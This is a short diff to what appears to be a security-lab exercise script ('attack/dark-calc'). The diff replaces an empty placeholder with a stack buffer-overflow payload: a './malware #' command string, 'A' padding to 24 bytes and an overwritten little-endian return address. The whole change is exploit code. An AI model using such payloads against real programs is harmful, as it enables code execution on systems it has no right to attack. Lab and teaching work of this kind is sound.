@@ -1,10 +1,9 @@
-#!/usr/bin/env python3
-"""Task 1: build the payload for attack/dark-calc.
-
-TODO: replace the empty payload with the bytes required by the lab.
-"""
 import sys
 
-payload = b""
+command = b"./malware #"
+padding = b"A" * (24 - len(command))
+address = (0x401a6b).to_bytes(8, "little")
 
-sys.stdout.buffer.write(payload)
+payload = command + padding + address
+
+sys.stdout.buffer.write(payload + b"\n")
